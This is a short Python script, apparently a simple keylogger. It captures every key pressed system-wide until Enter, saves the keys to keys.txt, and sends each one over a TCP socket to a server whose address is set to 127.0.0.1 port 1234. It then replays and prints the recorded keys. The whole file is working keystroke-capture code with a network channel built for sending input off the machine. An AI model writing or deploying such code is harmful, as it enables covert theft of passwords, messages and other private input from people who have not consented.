import keyboard
import socket

# define the IP address and port number of the server
SERVER_IP = "127.0.0.1"
SERVER_PORT = 1234

# create a socket object and connect to the server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((SERVER_IP, SERVER_PORT))

keys = []

# open file to store keys
with open("keys.txt", "w") as f:
    # record keys until ENTER is pressed
    while True:
        event = keyboard.read_event()
        if event.event_type == "down":
            if event.name == "enter":
                break
            keys.append(event.name)
            f.write(event.name + "\n")
            
            # send the keystroke to the server
            client_socket.send(event.name.encode())

# replay the recorded keys
keyboard.play(keys)

# print the recorded keys
print(keys)

# close the socket connection
client_socket.close()
